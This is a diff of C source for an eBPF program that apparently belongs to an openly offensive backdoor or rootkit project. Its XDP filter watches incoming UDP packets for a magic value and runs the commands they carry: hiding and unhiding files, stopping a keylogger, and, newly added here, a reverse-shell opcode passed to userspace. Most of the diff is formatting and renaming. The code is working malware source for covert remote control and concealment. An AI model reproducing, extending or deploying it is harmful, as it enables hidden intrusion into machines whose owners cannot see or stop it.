@@ -1,7 +1,8 @@
-#include <vmlinux.h>
-#include <bpf/bpf_helpers.h>
 #include <bpf/bpf_endian.h>
+#include <bpf/bpf_helpers.h>
 #include <asm-generic/errno-base.h>
+#include <vmlinux.h>
+
 #include "bpf/backdoor.h"
 #include "bpf/maps.h"
 
@@ -23,14 +24,14 @@ static void stop_keylogger()
     bpf_map_update_elem(&config_map, &key, &value, BPF_ANY);
 }
 
-static void hide_file(char *filename)
+static void hide_file(char* filename)
 {
     u8 value = 1;
 
     bpf_map_update_elem(&hide_names_map, filename, &value, BPF_ANY);
 }
 
-static void unhide_file(char *filename)
+static void unhide_file(char* filename)
 {
     bpf_map_delete_elem(&hide_names_map, filename);
 }
@@ -38,14 +39,14 @@ static void unhide_file(char *filename)
 /**
  * @brief Process command struct and execute command according
  * to the corrsponding opcode.
- * 
- * @param command 
+ *
+ * @param command
  * @return int returns 0 on command opcode identified and ran.
  * returns -ENOENT upon command opcode not found.
  */
-static int process_and_execute_command(struct command_packet *command)
+static int process_and_execute_command(command_packet_t* command)
 {
-    char command_data[MAX_NAME_LEN];
+    char command_data[MAX_HIDDEN_FILE_NAME_LEN];
 
     /* Check for magic payloads */
     switch (command->opcode) {
@@ -63,6 +64,9 @@ static int process_and_execute_command(struct command_packet *command)
         __builtin_memcpy(command_data, command->data, sizeof(command_data));
         unhide_file(command_data);
         break;
+    case COMMAND_REVERSE_SHELL:
+        /* Will be handles by userspace */
+        break;
     default:
         return -ENOENT; /* Normal UDP traffic */
     }
@@ -73,18 +77,18 @@ static int process_and_execute_command(struct command_packet *command)
 /**
  * @brief Submit event to userspace via ring buffer.
  * Event includes IP, source port and command opcode.
- * 
- * @param iph 
- * @param udph 
- * @param command 
+ *
+ * @param iph
+ * @param udph
+ * @param command
  */
-static void submit_event_to_userspace(struct iphdr *iph, struct udphdr *udph, struct command_packet *command)
+static void submit_event_to_userspace(struct iphdr* iph, struct udphdr* udph, command_packet_t* command)
 {
-    struct event_t *event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
+    struct event_t* event = bpf_ringbuf_reserve(&events, sizeof(*event), 0);
     if (event) {
         event->src_ip = iph->saddr;
         event->src_port = bpf_ntohs(udph->source);
-        event->payload_action = command->opcode;
+        event->command_opcode = command->opcode;
 
         /* Submit event to userspace */
         bpf_ringbuf_submit(event, 0);
@@ -95,39 +99,39 @@ static void submit_event_to_userspace(struct iphdr *iph, struct udphdr *udph, st
  * @brief XDP fmagic packet filter to filter UDP packet with
  * a specific magic and extract command from them.
  * The commands are the executed.
- * 
+ *
  */
 SEC("xdp")
-int filter_magic_packets(struct xdp_md *ctx)
+int filter_magic_packets(struct xdp_md* ctx)
 {
-    void *data_end = (void *)(long)ctx->data_end;
-    void *data = (void *)(long)ctx->data;
+    void* data_end = (void*)(long)ctx->data_end;
+    void* data = (void*)(long)ctx->data;
     int ret = 0;
 
     /* Parse ethernet header */
-    struct ethhdr *eth = data;
-    if ((void *)(eth + 1) > data_end)
+    struct ethhdr* eth = data;
+    if ((void*)(eth + 1) > data_end)
         return XDP_PASS;
 
     if (eth->h_proto != bpf_htons(ETH_P_IP))
         return XDP_PASS;
 
     /* Parse IP header */
-    struct iphdr *iph = (void *)(eth + 1);
-    if ((void *)(iph + 1) > data_end)
+    struct iphdr* iph = (void*)(eth + 1);
+    if ((void*)(iph + 1) > data_end)
         return XDP_PASS;
 
     if (iph->protocol != IPPROTO_UDP)
         return XDP_PASS;
 
     /* Parse UDP header */
-    struct udphdr *udph = (void *)(iph + 1);
-    if ((void *)(udph + 1) > data_end)
+    struct udphdr* udph = (void*)(iph + 1);
+    if ((void*)(udph + 1) > data_end)
         return XDP_PASS;
 
-    struct command_packet *command = (void *)(udph + 1);
+    command_packet_t* command = (void*)(udph + 1);
 
-    if ((void *)(command + 1) > data_end)
+    if ((void*)(command + 1) > data_end)
         return XDP_PASS;
 
     if (command->magic != COMMAND_MAGIC)
